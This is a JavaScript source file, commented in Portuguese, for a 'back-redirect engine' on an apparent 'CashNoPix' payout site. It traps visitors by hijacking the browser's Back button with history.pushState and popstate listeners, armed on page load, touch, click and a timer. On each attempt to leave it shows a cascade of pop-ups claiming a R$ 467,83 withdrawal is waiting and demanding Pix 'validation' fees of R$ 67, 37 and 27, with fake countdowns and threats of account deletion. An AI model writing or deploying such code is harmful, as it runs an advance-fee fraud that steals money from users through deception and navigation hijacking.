/**
 * CashNoPix — Bulletproof Back-Redirect Engine
 * Captura a tentativa de saída e mostra ofertas em cascata.
 * Desenvolvido para funcionar em Mobile Safari e Chrome.
 */
(function() {
    'use strict';

    // Se já foi carregado, não carrega de novo
    if (window.CNP_BACKREDIRECT_LOADED) return;
    window.CNP_BACKREDIRECT_LOADED = true;

    const OFFERS = [
        {
            title: 'ESPERA! NÃO VÁ EMBORA!',
            desc: 'Seu saque de R$ 467,83 está pronto. Mas você precisa validar sua conta para receber agora!',
            btn: 'Pagar R$ 67,00 e Receber Agora',
            color: '#16a34a',
            amount: 67.00
        },
        {
            title: '🔥 OFERTA EXCLUSIVA!',
            desc: 'Ainda não decidiu? Liberamos um desconto de 45% para você. Pague apenas R$ 37,00 e receba seu saldo agora!',
            btn: 'Pagar R$ 37,00 e Liberar Saque',
            color: '#d97706',
            amount: 37.00
        },
        {
            title: '⚡ ÚLTIMA CHANCE!',
            desc: 'Esta é sua última vaga. Reduzimos a taxa para o mínimo possível: R$ 27,00. Pague agora ou sua conta será excluída.',
            btn: 'Confirmar por R$ 27,00',
            color: '#dc2626',
            amount: 27.00
        }
    ];

    let currentLevel = 0;
    let isModalOpen = false;

    const style = document.createElement('style');
    style.innerHTML = `
        #br-overlay {
            position: fixed !important;
            inset: 0 !important;
            z-index: 2147483647 !important;
            background: rgba(0,0,0,0.85) !important;
            display: flex !important;          /* sempre flex, visibilidade controlada por opacity */
            align-items: flex-end !important;
            justify-content: center !important;
            opacity: 0;
            pointer-events: none;
            visibility: hidden;
            transition: opacity 0.3s ease, visibility 0.3s ease !important;
            font-family: 'Inter', -apple-system, sans-serif !important;
            -webkit-font-smoothing: antialiased;
        }
        #br-modal {
            background: #fff !important;
            width: 100% !important;
            max-width: 480px !important;
            border-radius: 24px 24px 0 0 !important;
            padding: 24px 20px 40px !important;
            transform: translateY(100%);
            transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) !important;
            box-sizing: border-box !important;
            max-height: 90vh !important;
            overflow-y: auto !important;
        }
        #br-overlay.br-active {
            opacity: 1 !important;
            pointer-events: auto !important;
            visibility: visible !important;
        }
        #br-overlay.br-active #br-modal { transform: translateY(0) !important; }
        
        .br-title { font-size: 22px !important; font-weight: 900 !important; color: #0f172a !important; margin: 0 0 8px !important; text-align: center !important; }
        .br-desc { font-size: 15px !important; color: #475569 !important; line-height: 1.6 !important; margin-bottom: 24px !important; text-align: center !important; }
        
        .br-timer-box {
            background: #fef2f2 !important;
            border: 1.5px solid #fecaca !important;
            border-radius: 12px !important;
            padding: 12px !important;
            text-align: center !important;
            margin-bottom: 20px !important;
        }
        .br-timer-lbl { font-size: 11px !important; font-weight: 700 !important; color: #ef4444 !important; text-transform: uppercase !important; margin-bottom: 2px !important; }
        .br-timer-val { font-size: 28px !important; font-weight: 900 !important; color: #ef4444 !important; }

        .br-btn { 
            display: block !important; width: 100% !important; padding: 18px !important; 
            border: none !important; border-radius: 14px !important;
            color: #fff !important; font-size: 16px !important; font-weight: 800 !important; 
            cursor: pointer !important; text-decoration: none !important;
            text-align: center !important; margin-bottom: 12px !important;
            box-shadow: 0 8px 20px rgba(0,0,0,0.15) !important;
            box-sizing: border-box !important;
        }
        .br-close { 
            background: none !important; border: 1px solid #e2e8f0 !important; 
            color: #94a3b8 !important; padding: 12px !important; 
            border-radius: 10px !important; cursor: pointer !important; 
            width: 100% !important; font-size: 14px !important;
        }
    `;
    document.head.appendChild(style);

    // Criar Overlay
    const overlay = document.createElement('div');
    overlay.id = 'br-overlay';
    overlay.innerHTML = `
        <div id="br-modal">
            <div style="width:36px;height:4px;background:#e2e8f0;border-radius:2px;margin:0 auto 20px;"></div>
            <div class="br-title" id="br-t"></div>
            <p class="br-desc" id="br-d"></p>
            <div class="br-timer-box">
                <div class="br-timer-lbl">⚡ Oferta expira em:</div>
                <div class="br-timer-val" id="br-clock">05:00</div>
            </div>
            <a href="#" class="br-btn" id="br-b"></a>
            <button class="br-close" id="br-c">Não quero meu dinheiro</button>
        </div>
    `;
    document.body.appendChild(overlay);

    const titleEl = document.getElementById('br-t');
    const descEl  = document.getElementById('br-d');
    const btnEl   = document.getElementById('br-b');
    const closeEl = document.getElementById('br-c');
    const clockEl = document.getElementById('br-clock');

    function updateClock() {
        let t = 300;
        const int = setInterval(() => {
            t--;
            if (t <= 0 || !isModalOpen) { clearInterval(int); return; }
            let m = Math.floor(t / 60);
            let s = t % 60;
            clockEl.textContent = `${m}:${String(s).padStart(2, '0')}`;
        }, 1000);
    }

    function showPopup() {
        if (currentLevel >= OFFERS.length) return;
        const offer = OFFERS[currentLevel];
        titleEl.textContent = offer.title;
        descEl.textContent  = offer.desc;
        btnEl.textContent   = offer.btn;
        btnEl.style.backgroundColor = offer.color;
        
        // When clicking the CTA on the backredirect, either call opening function or redirect
        btnEl.onclick = (e) => {
            e.preventDefault();
            if (typeof window.abrirPix === 'function') {
                closePopup();
                window.abrirPix(offer.amount);
            } else {
                // Se não estiver na página de taxa, manda pra lá
                window.location.href = 'taxa.html';
            }
        };

        overlay.classList.add('br-active');
        isModalOpen = true;
        updateClock();
        
        // Push state para garantir que o próximo 'Back' volte a cair aqui
        history.pushState(null, null, location.href);
    }

    function closePopup() {
        overlay.classList.remove('br-active');
        isModalOpen = false;
        currentLevel++;
        // Se ainda houver ofertas, mas o usuário fechou, não armamos de novo imediatamente
        // para permitir que ele saia se realmente quiser. Mas se ele navegar, o popstate pega.
    }

    closeEl.onclick = closePopup;
    overlay.onclick = (e) => { if (e.target === overlay) closePopup(); };

    // FUNÇÃO DE ARMAMENTO
    function arm() {
        // Garantir que temos um estado inicial para "voltar"
        if (history.state !== 'br-armed') {
            history.pushState('br-armed', null, location.href);
        }

        window.addEventListener('popstate', function(event) {
            // Sempre que o usuário tenta voltar, mostramos o popup se não estiver aberto
            if (!isModalOpen && currentLevel < OFFERS.length) {
                showPopup();
            }
        });
    }

    // Tentar armar em múltiplos gatilhos
    window.addEventListener('load', arm);
    window.addEventListener('touchstart', function() { if (!window.br_interacted) { arm(); window.br_interacted = true; } }, {passive: true});
    window.addEventListener('mousedown', function() { if (!window.br_interacted) { arm(); window.br_interacted = true; } });

    // Fallback de armamento
    setTimeout(arm, 1000);

})();
